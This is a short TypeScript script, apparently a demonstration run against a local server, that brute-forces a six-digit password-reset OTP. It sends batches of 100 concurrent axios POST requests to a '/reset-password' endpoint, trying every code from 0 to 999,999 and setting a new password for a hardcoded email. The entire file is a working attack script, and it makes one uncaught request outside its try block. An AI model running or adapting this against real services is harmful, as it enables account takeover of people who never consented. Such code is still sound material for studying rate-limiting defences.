import axios from "axios";

async function sendrequest(otp: string) {
  let data = JSON.stringify({
    email: "chandan1@gmail.com",
    otp: otp,
    newPassword: "763484257928"
  });

  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: { 
      'Content-Type': 'application/json'
    },
    data: data
  };

    await axios.request(config);

try {
    await axios.request(config)
    console.log("done for " + otp);
  } catch(e) {
    
  }
}

async function main() {
  for (let i = 0; i < 1000000; i+=100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendrequest((i + j).toString()))
    }
    await Promise.all(promises);
  }
}

main()
